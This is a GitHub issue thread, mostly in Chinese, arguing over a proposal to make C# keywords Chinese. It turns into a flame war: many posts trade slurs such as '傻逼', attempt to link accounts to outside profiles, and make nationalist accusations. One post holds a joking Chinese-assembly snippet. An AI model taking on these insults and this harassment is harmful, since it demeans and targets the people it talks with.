We have wasted long time to prove there's only algorithm and input/output in programming language. Nothing more. If you want, you can take a paper card, prepare your machine code, and punch it by your hand. And roll it to your computer. 

PL is just an abstract, or a set of mnemonic symbol. To prove that you have skills in signal, algorithm and advanced math. Please perform a Laplace Transform on ZOH, or try to understand the following program written by ""C++"". 

I don't want to translate the rest part of this reply. Because I think he will google it. English paper or document will easy to find by this way.

BTW, if you haven't any skills in computing or electric. Please stop spamming, it only loses your face, and wastes our bandwidth and stoage. It is a bad idea."
2603	"@rgwan 
你想说西就说西吧.这是你的自由.

另外,中文编程最开始解决的并不是特定领域的问题."
2604	"@qwas982 

这些问题可不是什么特定领域的东西。而是到处都能用到的东西~

再举个例子，链表，各种索引树，数据库。常见吧？你觉得一个没有算法和高数基础的人，看得懂全中文写的代码？

界面显示上，光线追踪，贴图，也广泛使用吧。你觉得一个计算机图形学都没学过的人，能看得懂这些算法或者他们的中文编程实现？

老铁，醒醒啊~你说的这些好处根本就不存在！"
2605	"@qwas982 

最后回你一次，基础知识是很重要的，不是开脑洞就能做到的。就像酒店里的厨师和你用一样的厨具，他做得肯定比你好吃，肯定做得出你做不出来的菜。这就是知识的体现。并不是说你用中式菜刀就能比专业的厨师（也用中式菜刀，即使他不是中国厨师）切的好。你用上中式菜刀也不会和中华小当家一样如有神助，做出好菜手到擒来。人家做菜靠知识，又不靠厨具。编程也是一回事。

你所谓的开源实现共产主义。

“1,整合重构开源共享知识体系,对教育革命.任何人都能轻易学习到先进的与时俱进的知识,增强生存能力.”

编译原理是不是公开的知识？LLVM和.NET是不是开放的平台。早有了！你跑过来提这个问题干吗，直接叉一份回去改啊！改完再申请合并或者不申请合并，那都是你的事。

你看你自己都做不到你所谓构想中的第一步。就在这里指点江山激扬文字。我实在不知道这意义何在，对我们的生活作出了什么样的改变。你做出东西来了，才能够论证行不行。现在你这八字没一撇的就过来浪费网络带宽、流量和存储空间。并且在没有任何人大规模使用的条件下就来证明所谓的“优点”。是不是有点搞笑了？

加州大学伯克利分校那帮人搞RISC-V还专门做了个Chisel语言论证原型呢。做出来以后一版一版改进，虽然口水仗也多，但是商业应用也在逐步推进，社区也在逐步完善。

而你，好歹也得折腾个编译的工具链和一个商业化的实例项目吧。工具是要实际检验过的，你光吹是没用的！

自己所谓的第一步都迈不开，还写一大堆宏伟的计划。子曾经曰过：思而不学则殆。大概说的就是你这种人吧。"
2606	"> @Henrycobaltech 
Oh, my friend, this project is open source, you can fork it and implement the Chinese key words you want, and name you new language FANG JING.

@qwas982 
He is right, just implement what you want and let time prove you are right."
2607	"To @gafter 
The guy(a.k.a @qwas982 )is insane.
If you take what I said and translate it via google you'll find out that all I want to say is that using local language to programming is not international and is harmful to global coder's community.
As you can see that coders all around the world are using English,not just coding but also communicating.For example , we are communicating here via English right?If I am using Chinese it is almost impossible for you to understand what I am talking about.
I'm sorry for calling him insane or whatever , but it's just polite,www
"
2608	"To @ufcpp 
Sorry because I don't understand Japanese.
To be honest I think coding in English is a instinct.
Using English in coding is very smooth and when I start thinking what this code means it slows me down."
2609	"@qwas982 请继续你的表演，让我们看看人能厚颜无耻到什么地步，别停
还有，提issue前请先google一下，不要用这种愚蠢到了极点的issue污染别人的tl和眼睛"
2610	"@qwas982 
Firstly, there's no need to make everyone has capability in writing code, especially here comes the rise of AI.
Secondly, even though you can write C# or .net in your mother tongue, it's still essential for you to reading articles writing in English to improve your coding skills.
Thirdly, it will not be fast in typing Chinese characters in coding in fact.
In the end, if you really has passion to be a good coder, English cannot be a large obstacle for you

首先，没必要让每个人都编程，尤其是现在AI正在崛起（能让机器人干何必自己亲自动手，我们写代码是为了造福人类，不是要让每个人都成为代码的奴隶）
其次，即使你用汉语写C#和.net，你还是得阅读英文文章来提高技术（所以别偷懒了）
第三，你不觉得写中文编码费劲么？敲那么多就蹦出来一个字儿
最后，你要真的爱编程，学英语吧，如果不想学，抱歉，你不是真爱。
"
2611	"@rgwan
你有什么问题?我什么时候跑到这里提""开源实现共产主义""这个话题了?我有带到这里?这是你们带来的吧.
我觉得你喜欢造谣,与他们一样,对,你们继续""指点江山激扬文字""吧,我只想说我是在讨论,不是在""指点江山激扬文字"",你们要解读成这样,是你们自己的事,不代表我表达了这样的观点。
我在这里讨论,你却说我想证明,这是你的观点,不要在这里强加给我,因为我也没强加给别人什么.这里只是自由讨论中文编程,中文化C#的可行性.你不允许别人讨论吗?

@boblao0714
看你的发言记录,我觉得你说的话是在形容你自己,此地无银三百两.你估计是仇视中文,汉字,和前面的一个朋友的评论描述的很像,就是abc,要不就是逆向种族主义.或者像bctnry在QQ群里一样寻衅滋事,其实只有17岁,可能年龄也不大.所以反中国,反华.
你和这个bctnry只会点反对的家伙一样.多说无益,不想在回复你们这些寻衅滋事的

这傻逼认为他自己可以不停对别人的回复点踩,别人不能点他,也是奇葩了.他还分不清先后顺序,他自己先给人扣帽子(从他的第一条回复开始),却说别人在给他扣帽子,可以说是强词夺理了.
看他后续的回复,他好像还喜欢王婆卖瓜."
2612	"@infinite2009 
确实，但是我觉得编程是一个创造性的工作，还是需要人去写的，AI不能创造只能机械重复。
Yeah I agree with you.
But I think programming is a creative work and human beings are still necessary to it because AI can't create things and it can only repeat.
"
2613	"@qwas982 解释一下？我怎么此地无银三百两了？厉害了
还有，你前面回答@rgwan 的时候说他是把别的话题带过来，你不是？
前脚骂人后脚就拿他的方式对付我，牛逼牛逼"
2614	"@qwas982 

第一、你要证明你的思想是正确的，就不要再这里废话。拿出你的成果出来，看看能提高多少编码速率，能够怎么样让人直接理解代码。显然，在这一点上，我没有见到你有任何有力的实证！反而你本人的基础学科的水平暴露无遗。

第二、要实现你公开的企划中展现的目标。必须按照企划的目的从自己开始严格要求自己。我只是拿你的观点出来，比照你的行为。"
2615	@rgwan 很多时候写码用汉语思考真的很拖速度，还是英语思维舒服
2616	直播围观傻逼上线点踩
2617	"@boblao0714 

没有感觉到思维的时候需要语言啊哈哈哈。思考的时候都是思考数学与逻辑上关系~还有实现的速度、大小（面积）。"
2618	"@rgwan 確かに
但是有的时候还是会想这个语句什么意思的2333
可能因为我是个萌新吧23333"
2619	"@rgwan 其实我很想屏蔽这个智障但是感觉给我马哲托福备考的时候加点乐趣也好
围观傻逼炒鸡开心的2333333"
2620	"@boblao0714 我觉得自然语言有时候的确描述不清一个东西。你可以看大部分国内的操作系统和编译课都尝试用自然语言描述它们的东西，所以效果非常差。

就算是占用空间很大的流程图，也要优于自然语言。"
2621	@wizardforcel 是的，像计算机编程这种专业性很强的东西本身就不适合普及，想想看，算法这些东西没基础怎么学的懂。
2622	"@boblao0714 普及它是为了获得生态、社群、资料和人才这些其它方面的收益。

就类似于“我要一个良好的生态，但我自己没那么大精力创造，要发动大家一起干”这种感觉。"
2623	"@qwas982 
可以啊，扣帽子，厉害厉害
那我就说清楚好了，我确实17岁，有问题吗？你口口声声普及编程又歧视我们这些学习的人，几个意思？是自打脸还是石乐志？
所以你也就像共青团一样，就只能喷人，一点逻辑依据都提不出来，对你这种人我无话可说，喷子就躲在网易猪场好了，请别来github侮辱我们计算机爱好者和程序员的声誉！滚！"
2624	"@wizardforcel 
现在全球那么多开发者社区也就是这样的目的
我的意思主要是说就是编程不适合过度简单，因为像算法这些东西其实有很大一部分作用就是为了剔除像@qwas982 这样只说不做的“程序员”，而真正想要学习，热爱计算机和编程的会有大量资料辅佐，我觉得这样才是正常状态。"
2625	"https://www.zhihu.com/question/66642888/answer/245718877
直播看傻逼"
2626	"@boblao0714 

现在编程已经足够简单了，难点还是“要做什么，要算什么，怎么实现”。

以前所谓的编程是算传递函数，然后用电子管或者运放三极管之类的搭一个，或者画卡诺图，然后用一排排继电器搭出来。比如早期的电视的整个系统，早期的电报电话交换通信系统之类的。

现在就记几个关键字，一些简单的表达式，就能让根本不懂计算机原理的人弄个Hello world出来。这还不算简单？"
2627	"@rgwan 
是的，是很简单了
所以现在还说要做“中文编程”的都是傻逼
这完全没有意义
但是还好，一旦深入进去，有机制能剔除像@qwas982这样的傻逼"
2628	"这里有很多人已经从讨论C#  讨论中文编程,转变为了人身攻击,他们从攻击我的观点到攻击我的人身,可见素质如何,嗯,我的素质也不行,可能是他们带来的风气

There are a lot of people have been from the discussion of C # and the discussion of Chinese programming, into a personal attack, they attack my point of view to attack my personal, showing how poor quality, ah, my quality is not OK, may be their atmosphere"
2629	"@qwas982 
your quality is not OK
it should be I'm not very polite
you sucker
我真的不知道你的英语是哪个老师教的，用Google翻译是你智商低我不怪你但是起码得稍微修饰一下吧
一个靠Google机翻的骂我们一群不用翻译的......
那你很棒棒哦
这可以说是非常爆笑了
还有，谁先开口骂人的，心里面真的没点B数？"
2630	"果然是来寻衅滋事的,
看来无需再关注这几个账号的回复"
2631	"@qwas982 
我本来只是质疑你的思想，但是你这智障让我不得不开始人身攻击，不过你扣帽子的技巧还真是naive，还需要学习一个
你都能发表http://i.mtime.com/2158632/blog/4583707/ http://i.mtime.com/2158632/blog/7945623/ 这种东西了
智商真的很低

"
2632	"@boblao0714
我看你是病的不轻,来这里寻衅滋事,而非讨论的,你最积极.
这个在时光网的账号与我同名,于是你就可以认为是我?并强行联系起来?这样的智商确实挺naive的.
智障,走好,不送.对于低幼的人身攻击,你觉得别人智商低就低吧,这代表了你的认识.

"
2633	"https://imgchr.com/i/JzvT0
https://imgchr.com/i/YSd1g

bctnry这个账号在QQ群里贬低中文编程,bctnry并在这里寻衅滋事,与这个账号boblao0714一样风格,可见他们的是什么样的素质和讨论态度
他觉得用汉字和中文字符很[丢人].可见其是多么的自卑,现在中国在大力提倡文化自信,看起来,他是在反其道而行之"
2634	"@qwas982 
虽然我希望这个issue立刻lock掉, 结束这无意义口水战.
但我还是必须把我自己之前所有言论给[您](https://github.com/neko-dev/GUIDELINE/blob/master/docs/others/copywriter.md#%E9%81%A3%E8%AF%8D%E9%80%A0%E5%8F%A5)贴出来, 回您的话:

>既然贴出了我回复你们对我的""谩骂,嘲讽和羞辱"",那咋不把你们自己 __羞辱谩骂嘲讽他人的评论也贴出来呢__ ?果然是 __小人行径__ .

>我需要澄清一下,这几个账号pigfromChina bctnry(当然,还有一些) __是在这里反对我的观点并进行人身攻击最多的__ .我初始的时候,并没有在意他们的攻击,但是这反而 __让他们得寸进尺.__ 我觉得有必要说明下他们的 __丑恶__ 行径.
pigfromChina 他只是贴出了我回复他们对我的""谩骂,嘲讽和羞辱"",但并没有把他们自己,羞辱谩骂嘲讽他人的评论也贴出来呢?他们的行为如何,我无须多言.

或许我的话未必能完全符合 .NET 社区的[CoC](https://dotnetfoundation.org/code-of-conduct), 但阁下卑见我这个高中生还是比您的辱骂优雅. 

![0](https://screenshots.firefoxusercontent.com/images/12e335a6-128a-4514-b7f4-76d825811ac0.png)
![1](https://screenshots.firefoxusercontent.com/images/88d9c40e-2129-48f5-a215-64f466de3651.png)
![2](https://screenshots.firefoxusercontent.com/images/157eb6b8-5938-4633-bba6-8b399635ed15.png)
![3](https://screenshots.firefoxusercontent.com/images/ac355a8d-c97c-4e48-b12e-4d5b33f14029.png)
![4](https://screenshots.firefoxusercontent.com/images/a3bab6c8-e3d2-438d-911e-6128b49dbf4c.png)
![5](https://screenshots.firefoxusercontent.com/images/2b114c18-db94-4f63-bb98-8bafeb0604b7.png)
![6](https://screenshots.firefoxusercontent.com/images/c0c49ea2-debc-4ce4-9f76-5ed878f3dcbc.png)
![7](https://screenshots.firefoxusercontent.com/images/c85283f7-5e4b-48bf-8e49-b8f849f81c7d.png)
![8](https://screenshots.firefoxusercontent.com/images/29d9f453-6eda-4078-b09e-9919ee03d0eb.png)
![9](https://screenshots.firefoxusercontent.com/images/c5c39fa4-4134-4bd1-8d6a-5668054e9dfe.png)
![10](https://screenshots.firefoxusercontent.com/images/0d37dcbe-a799-44cd-9fdb-bd6e7ae3e9ce.png)
(https://github.com/shadowsocks/shadowsocks-windows/issues/293#issuecomment-132253168)
![11](https://screenshots.firefoxusercontent.com/images/d168849b-fca1-452c-ac5c-2e01f727cf5b.png)

### 再次声明下: 不要给自己臆造幻想中的敌人, 认为别人粗鲁的人首先应该审视自己."
2635	"哦，我的朋友，在此之前，我觉得我们应该先从底层出发，众所周知的是，底层的二进制是`0`,`1`，这个暂且就认为中国也有份吧，就不再转化了，那么接下来是什么呢？汇编语言，好吧，我觉得我们当下应该先把`汇编`这种简单的语言翻译转化一下，说到`汇编`，那么自然就需要进行寄存器了。以`x86`汇编为例，我们进行如下转化。

|寄存器|中文
|:--|:--
|eax|甲
|ebx|乙
|ecx|丙
|edx|丁
|esi|戊
|edi|己
|esp|庚
|ebp|辛
|eip|壬

 常用的汇编指令表：

|指令|中文
|:--|--
|mov|来呀
|add |加一起
|push|把它压到栈
|pop|从栈里弹出来
|retn|返回


好吧，我们终于可以实现1+1=2了。
```asm
把它压到栈 辛
来呀 辛,庚
来呀 甲,1
加一起 甲,1
来呀 庚,辛
从栈里弹出来 辛
```

你看，中文汇编其实也没多难吧。是吗？是吧。^ _ ^"
2636	"我无意于攻击楼主的人身。但是楼主的确专业水平和素质堪忧。建议回炉重修，或者自己亲身体会一下自己的想法是不是必要且恰当。比如说自己动手弄一个丙井或者丙正正。

-------------------------------------------------

To issue creator.

I'm not interested in personal attacking. Especially, it is not necessary to attacking your ""quality"". Obviously, you're ' a low quality product' in specialized level. And you re in high level at putting label, just like the Red Ap in the past. I recommend you return to college or high school to re-learn all about moral education and math.

When you have a proper level. Think carefully, Talk lessly and the most important part is do everything resolutely. Realize or experience a Chinese-token PL, e.g. C++ or C#. You will know necessity of that. "
2637	"@rgwan 
那你的意思是,只准别人骂我,我不能骂别人咯?对吧?
这些低素质的垃圾你不去谴责,却来谴责我回复他们的字段,果然是本末倒置,舍本逐末.这很`正义`!

前面也有专业讨论的呀,你不看能怪谁.

注意看,我刚刚发完评论,bctnry这个垃圾就来点反对,其心可诛,其心是否为小人,还用我说?"
2638	"@qwas982

专业讨论的几个帖子，其实我并没有看到你拿得出什么有说服力的证据证明中文编程更好，或者更高效，或者更省事。反而还会阻隔信息的流通，人为制造壁垒。

I dont think you hit the point of Chinese programming. At least, now, you havent ANY forceful evidence to prove Chinese programming is more better than use latin characters. On the contrary, use Chinese character will build a wall around Chinese world. Just like the policy that Qing Dynasty has implemented."
2639	"@rgwan 
我在这里发这个倡议讨论的是 中文版C#  之实现的可行性,顺便讨论下中文编程的的意义,你却要我去证明你讲的那一套,你是在命令我吗?你不知道什么叫讨论,探讨,探索是吗?

你认为不好,不高效,也不省事,那就随你呀,这是你的自由,只不过不要来强加给我就行,
我也没有强加给别人什么,如果是要一个劲地非要硬是把我的原意解读为,我是在要求别的开发团队来实现我的意志,那请便.

另外,你非要强调中文编程不行,汉字不好,中文字符不适合编程,这是你的自由,我不干涉.别艾特我了,你发在这里就行.别人看不看,愿不愿意看是他们的自由.

是的,如果你觉得浪费了时间,我抱歉,请选择远离这个已经被国内低素质人群占领的issues吧."
2640	"@qwas982 
我不知道你是怎么认为我认为我用汉语丢人
而且，就你还好意思说别人来了就点反对？我跟别人交流没提到你一丁点皮毛你点个屁反对？石乐志？
我很同意@rgwan的观点，你要说人话请你拿出证据说人话，而你现在这B样我真的不想再文明下去。
各位围观群众可以去我github主页上写的几个平台搜索隔雨听竹，那个账号是我，你们可以看一下我平时是怎么说话的，如果真的是像这位傻逼说的一样恨国、以说汉语为耻，我删号
傻逼，贴脸就特么别怂啊"
2641	"Do what you here to do. I have run out my time on this boring topic.

最后再说一次，我个人认为没有意义。编程不是去学语法特性的，而是拿来跑算法和业务逻辑的。你在前面论证的上到99下到刚会走直接能看懂的情况其实是不存在的。后面更是升格到民族自尊和哲学层次上，实在令人汗颜。

搞工程讲求实践。希望你能够自己尝试后，再来提出自己的观点。而不是站在非业内人士的角度上指指点点。

挂线"
2642	"@boblao0714
 
你像苍蝇一样.

苍蝇正在我的周围飞舞.......

理解力也是堪忧,他认为我说 `两个账号的发言风格相似`, 就=说两个同名ID是一个人."
2643	"@qwas982 
还有，凭什么你可以说两个同名ID是一个人但是我说就是傻逼？
呵呵 我觉得这两个账号的发言风格相似，连二者智商都低的吓人，我认为这两个账号是同一个人操作有问题吗？
第二点，若你要求微软的工作组给你做翻译，请自己付费，不要来github放屁，污了我们的眼睛。你要知道，只有你这个傻逼认为编程需要中文，所以你的需求你自己付费我相信没人会想跟你say no的，"
2644	@qwas982 你忘记红心了，要不我帮你打一个？
2645	"@boblao0714 
哦， 你误会了。我的意思是，有了AI的帮助，我想就可以不需要特别多的人去动手写代码了。当然AI本身还需要程序员维护:D"
2646	"@infinite2009 23333
确实是这样的，而且这样也能堵住@qwas982这个傻逼的嘴"
2647	"你才是傻逼,赶紧滚开这个issues,滚.
张口闭口傻逼,你以为你多聪明似的.你全家都是傻逼.懂吧

对待低素质的垃圾人何须文明用语.
@rgwan  来看吧,如果遇到这种一直用脏话骂你的人,你怎么面对,我很想知道.

看他多不要脸.果然,垃圾会把你拉到与他同一个水平.
boblao0714这个垃圾好像没有半点自律的能力."
2648	"@qwas982 哟哟哟，终于开始了
最后的伪装都撕下了啊
哈哈哈"
2649	close #993
2650	"你敢把字符换成中文字符么?
Can you change characters into Chinese characters?

"
2651	"我想問這個issue為什麼還沒有被關閉？
github什麼時候變成知乎了？
建議po主先去知乎開一個討論，標題可以寫。
“為什麼沒人開發中文shell命令？為什麼鍵盤上是26個英文字母也不是1000個常用漢字？為什麼網址都用英文字母不用漢字？163.com為什麼不是一六三點坑？”"
2652	"@qwas982 
如果你现在 __close掉__ 这个讨论了五天, 放置的位置不合适的issue, 摆出一个 __更加虚心, 诚恳的态度.__

欢迎加入 [Ruby China](ruby-china.org), [Laravel China](laravel-china.org), [avplayer.org](avplayer.org), [GitHub中文编程组织](github.com/program-in-chinese), [Rust 中文Chat](chat.rust-china.org).

还有
zyuyan.org Z语言是新型的类似自然语言的汉语编程语言,而且是开源的，人人都可以参与它的建设。
voldev.net 火山软件开发平台是一种目的硬件设备无关、目的软件环境无关、易学易用实用、完全本地化的软件快速开发平台
vg3d.com Volcano是易语言作者吴涛花费数年时间全力开发的一款大型3D MMORPG(多人在线角色扮演)网络游戏的快速集成开发软件,用作支持用户快速 轻松开发具有真实游戏环境和丰富游戏玩点的网络游戏
eyuyan.com 易语言
blog.163.com/xiyuyan@yeah 习语言
加壳鬼不给hostname iApp 垃圾""娱乐化编程"" 游改乐出品
scratch.mit.edu Scratch 跨国跨平台跨语言实现 教坏小孩子的儿童图形编程
oschina.net/p/olanguage O 项目没有主页的
tieba.baidu.com/f?kw=汉编 汉编-汉语程序设计语言， 即沈志斌教授发明的一种计算机程序设计语言

只是请不要继续这无意义的给中国开发者抹黑了... 🙈 
你就没有发现讨论越来越跑题了?"
2653	"我没有代表中国开发者,请不要以你已经被代表了这样的立场自居.
你觉得丢脸是你的事,与我无关,谢谢

关闭是不可能的,我不可能关闭,我自认为讨论C# 中文化没什么问题,github不是中国人的,更不是你家的,并且社区规则也是允许自由讨论.
如果你觉得浪费了时间,我抱歉,请选择远离这个已经被国内低素质人群占领的issues吧.
其起初是没有这么多低素质人来的,后面的讨论也是逐渐的被这群人搅黄的,我觉得你应该谴责这些人.特别是我的每个评论,几乎都有`boblao0714 `   `bctnry` 这两个垃圾(当然,还有几个也蹦跶的很欢快)在这里点反对,我觉得你应该去谴责他们.你来谴责我,我不可能认同你.

我已经表达过多次,
汉化,中文化 token只是第一步,并不是转化后就此停止.有了第一步,才有持续改进的对象.我不可能再思考一步登天,一步到位的那些路了,因为我已经尝试过(你可以看我的仓库,我汉化过tinycc),以失败告终.
汉化token可能看起来很低端,不入流.但是确实是可以踏出的第一步.汉化后马上又可以用.所以我觉得循序渐进,步步为营还是来得实在些.毕竟,有很多不支持中文编程的人在虎视眈眈,时刻想着打压或浇灭中文编程的道路.
目前我正在学习python相关的工具,我觉得开发一个二叉树或树形图解析器来解析数以亿计的文档 , 代码 ,程序语言 , 算法 会更有效地帮助我解构程序语言,并创造新的程序语言.没有用C#是因为C#还是不如python简洁,但C#却是一个很好改的对象,当然,python也一样.所以,有更简单的工具用,我肯定会选择更简单的."
2654	"目前,这里有;
反对中文编程,
中立,
支持中文编程,
野蛮土匪,
这几大类人在这个iss里.不知你是哪类"
2655	@qwas982 我说您能先把您的逻辑错误全部改过来再说话吗？建立在充满逻辑谬误，无事实的论据上的论证毫无意义
2656	"I don't read all chinese text above but I would like to say that, the idea of universal programming language should be a new language not mod an existing language into universal

I also have an idea that universal language should not have any keyword at all. Every keyword should replaced with symbol. So all the name can be use any language and will not see other language, only symbol and one language you want"
2657	"@Glavo 

你把你那些断章取义,望文生义,各种无关联的逻辑片断组合在一起就说我是`充满逻辑谬误` ?
我应该听你的?你是在命令我吗?"
2658	"@Thaina 

你好,朋友,其实这叫 心电感应 .已经超越语言.

Hello
friend,

In fact, this is called ECG induction. Has gone beyond any language."
2659	@Thaina I also think so. A new-designed symbol system is fair to everyone, seemingly.
2660	@qwas982 您也知道您的逻辑每一片都是错误啊，那您就不考虑一下怎么修改吗？
2661	@qwas982 您从这个 issue 的标题就开始 _命令_ 仓库的维护者，或者说他们应该听您的？
2662	"@Glavo 

你让我感到震惊,原来你看不懂别人的原话.有意思."
2663	"@qwas982 

> You agree that you will not under any circumstances upload, post, host, or transmit any content that:
is unlawful or promotes unlawful activities;
is or contains sexually obscene content;
is libelous, defamatory, or fraudulent;
**is discriminatory or abusive toward any individual or group;**
contains or installs any active malware or exploits, or uses our platform for exploit delivery (such as part of a command and control system); or
infringes on any proprietary right of any party, including patent, trademark, trade secret, copyright, right of publicity, or other rights.
[GitHub Terms of Service](https://help.github.com/articles/github-terms-of-service/#c-acceptable-use)

[Report abuse](https://github.com/contact/report-abuse?report=qwas982+%28user%29)

"
2664	"@borisding1994
1请先对 `boblao0714`   `bctnry`  这两个账号讲,谢谢


2他们对我每个评论都点反对,请问这是不是骚扰.


Report abuse 我?
难道你的行为不是滥用?可笑,
看起来你想阻止别人说话,

[报告borisding1994滥用 ](https://github.com/contact/report-abuse?report=borisding1994+%28user%29)"
2665	"@qwas982 
您对我指出来的错误左右搪塞，用一句
> 断章取义,望文生义,各种无关联的逻辑片断组合在一起就说我是充满逻辑谬误

来避免正面回应，那我只能认为我指出的这些错误是真正存在的，并且您无力修改。那么就没有好说的了，希望您能继续撒泼下去，抹黑我们的祖国。再见"
2666	"@Glavo
你是不是傻,你说的那些全是无中生有,全是根据你自己一厢情愿的解读去判断,与我何干?我不想做所谓的 `解答`.懂?

难道你把新华字典里的,或辞海里的字词乱搭后,也要出版社去改`你所认为的`吗?
你才是在撒泼.抹黑祖国? 你能代表祖国? 搞笑."
2667	"总结下实现中文化C#的意义

`决定生产力水平由4个关键要素的效率决定的：生产的方式、信息交换的方式、物流与人流的效率`。
https://zhuanlan.zhihu.com/p/30144437


1,中国有庞大的市场.而且是立体的.
2,人多力量大,当参与人数指数级增长后,对整个社会带来的经济回报也是指数级增长.
3,增加熵容量.现在中国的生产方式急需改进,如果有更多的智慧(编程)融入生产制造,无疑将完全改变现有制造现状.

目前真正进入这一行业的人还是太少; 
[中国软件信息行业从业人员达470万](http://www.kejixun.com/article/201406/52217.html)
这还只是2014年的新闻,统计的还是13年的数据,即便是现在也不会超过500万,这相对中国14亿人来说,实在是太少太少了.
编程和机电一体化(智能制造,生产)挂钩,将会带来前所未有的能量,加上中国充满潜力的人口数量.未来中国经济不可估量.
所以要解决这个问题-编程,首先就要解决中文编程.让技术为人而动,而不是,人为技术而动.利用好中国庞大的人口资源和市场资源.

未来中国的半导体产业会不断地减少对国外的依赖,现在发展的是存储半导体
[深入读懂半导体存储技术及市场，鄙文即可！ - 全文](http://www.elecfans.com/consume/433367_a.html)
当存储半导体发展到一定规模就是逻辑芯片半导体.Intel也是走的这条路,Intel最先的业务是卖内存.之后才是设计8008芯片.

当我们国家有了自己的硬件产业,必然会对软件产业提出新的需求,如果我们现在就开始实现中文编程,无疑将占得先机.20年后,中国会诞生远超国外的硬件和软件企业.
人口资源和市场资源,其实就是优势,这个优势用好了,先机占到了,生态/库 这些问题根本不是问题(可见上面有很多人鼠目寸光).

我们的容量这么大,却只被500万人左右着,并且这500万人里,还并不都是编程的.实际参与人数真的更少.
这样的状况严重限制了我们的经济发展."
2668	总之这里的讨论95%以上是无意义的，这样的吵吵我在群里天天能碰到，用英文编程就是政治正确，哪管他连最基本的的错误提示都看不懂，到处求人问东问西。我是业余爱好，有人管我们叫民科。不管怎么样。经过几年的学习，虽然英语我还是不会读但是，我经常接触的单词我就当是代号12345一样的背下来了，有ide的帮助也能写程序，代码注释虽然看不懂但有百度、有道、必应等等翻译，凑合着看，翻译的不明白就试验几次也基本解决了，虽然效率底，没办法谁叫我是英语盲呢，谁叫中国的技术就是差。中国好的技术也是英文文档，我照样看不懂呢。付出比别人多1倍的努力也能有收获。我自己自学的这10几年经验告诉我。像我这样资质的人有一半以上的时间浪费在语言或者说文档看不懂，需要自己一点点的研究。现在我虽然基本摆脱了没有中文资料就没法写程序的层面，但我还是希望有一款能够推广起来的中文编程语言出来，我自己是从易语言及按键精灵入门的，在初学阶段这种中编程语言或工具给我很大的帮助及启发。但这2款语言有很大的自身局限性，这是他们的产品定位运营能力技术实力等等综合原因造成的。所以就很希望有个技术实力的公司能推出一款中文编程语言，最好是微软出的，因为我就是粉微软。也因为所有大公司里微软的中文资料是最全的，技术文档的翻译也是必应最好。比百度和阿里的文档中文资料都多的多。<p> 中文编程有没有未来我有我的判断，也给微软写了几次意见，都是在msdn做调查的时候写的，效果反馈是一点没有。近年微软开源了C#、.net、typescript、vscode等等工具后，自己在这个基础上实现我的想法成为了现实。虽然在国内中文编程并没有多大的市场，但百万级还是有的这些人在“专业人员”眼里都是小学生、中学生、辍学生、民科成员。。。但在我看来他们分布在各行各业，有各种各样的需求，也有各行各业的经验。如果有好的工具他们能创造出更符合实际使用情况的作品。我就是要制作这样的工具。在有些人眼里这样是不入流的跟不上时代发展，就没人考虑过有多少人是不想入流的，我也根本不要求跟上时代，我只是希望解决我的需求，你们解决不了，也不想解决。我自己动手，自己解决。</p><p> IT产业在国内也不是一天两天了。但这些专业人员有什么成绩么？不要说什么百度、腾讯、阿里在中国那么大的市场环境下，政策保护到全世界绝无仅有的程度下（好像比朝鲜强），在中国以外有影响么？中国每年有7~800万毕业的学生，小国的总人口都没这些，但这和他们取得的成绩相符么？有人说是中国的基础教育有问题培养不出顶尖的人才，我看不是基础教育的问题，是家里教育有问题。</p>
2669	"@rozbo dalao能帮V4FNMADDSS这个指令起个中文名么_(:3_|∠)_

顺便我是觉得这issue应该close as won't fix了，新创个语言干嘛跑人家这里来……"
2670	"Summed up the meaning of the realization of cultural C #

Determining the level of productivity is determined by the efficiency of four key elements: the way of production, the way information is exchanged, and the efficiency of logistics and people.
https://zhuanlan.zhihu.com/p/30144437


1, China has a huge market, and is three-dimensional.
2, people and more powerful, when the number of participants after the growth index, the economic return to the whole society is also an exponential growth.
3, increase the entropy capacity.Now China's production methods need to be improved, if there is more wisdom (programming) into the manufacturing, will undoubtedly completely change the existing manufacturing status.

Now really enter the industry or too few people;
China's software information industry practitioners reached 4.7 million 
http://www.kejixun.com/article/201406/52217.html

This is only the 2014 news, statistics, or 13 years of data, even now it will not exceed 5 million, which is 1.4 billion relative to China, it is too little too little.
Programming and electromechanical integration (intelligent manufacturing, production) hook, will bring unprecedented energy, coupled with China's potential population, the future of China's economy is immeasurable.
So to solve this problem - programming, we must first solve the Chinese programming. Let the technology move, rather than, man-made technology and make use of China's huge population resources and market resources.

The future of China's semiconductor industry will continue to reduce dependence on foreign countries, and now the development of storage semiconductors
http://www.elecfans.com/consume/433367_a.html

In-depth understanding of semiconductor storage technology and market, can be contemplated! - Full text
When the semiconductor development to a certain size is the logic of semiconductor chips.Intel is also the way to go, Intel's first business is to sell memory. After the design is 8008 chip.

When our country has its own hardware industry, will inevitably put forward new demands on the software industry, if we now begin to achieve Chinese programming, will undoubtedly take the initiative .20 years later, China will be born far more than foreign hardware and software enterprise.
Population resources and market resources, in fact, is the advantage, this advantage is good, the initiative accounted for, ecological / library these issues is not a problem (see a lot of people above the slim light).

Our capacity is so big, but only about 5 million people, and this 500 million people, but also not all programming. The actual number of participants is really less.
This situation severely limits our economic development."
2671	"@htwx

兄弟,看我新总结的文章.
朋友,我看了你的文章,说的太好了,切中了要害,
上面一大堆反对中文编程的,大多鼠目寸光看不到这些,所以他们掩耳盗铃,皇帝新衣,选择性失明.

我觉得极有可能的情况是,他们是想保住现在他们的地位,他们觉得编程普及后,他们就不能拥有现在的地位.
所以他们要尽力打压,事不关己高高挂起,何不食肉糜.他们不愿新入的人有更好地路走,他们只是在为自己着想罢了.自私,贪婪.
我与你一样,也是对编程感兴趣,通过自学一切相关的知识,包括硬件.但我觉得我的实践水平还比不上你,我会学习的.
"
2672	看见这么多dislike的我就放心了
2673	"@htwx 
你好，尽管写得很长，我还是认真看完了。如果你觉得你花10年自学，大部分时间浪费在了语言上，为什么不先花两年时间系统地学习英语呢？剩下8年就可以随心所欲地学习任何知识，不局限于计算机科学。你自以为中国程序员看不起你们所谓的“非专业”。你可知道你眼中的这些程序员花了多少努力达到现在这个水平么？你自学了10年，都无法理解BAT究竟对中国和世界产生了怎样的影响，我想也只有一种原因，那就是你那所谓的辛苦的努力，要么方法不当，要么就是在磨洋工。不说腾讯，百度和阿里是纳斯达克上市的公司，有多少国外的投资者在交易股票。如果这样的公司没有什么影响力，那么是什么在支撑他的股价呢？
       你说中国的程序员没什么成绩，那请问你用的电信网络、你用的QQ、微信是谁设计和开发的呢？如果你觉得这无足轻重，请不要再使用它们。你可以使用纯英文版的MSN和Skype。
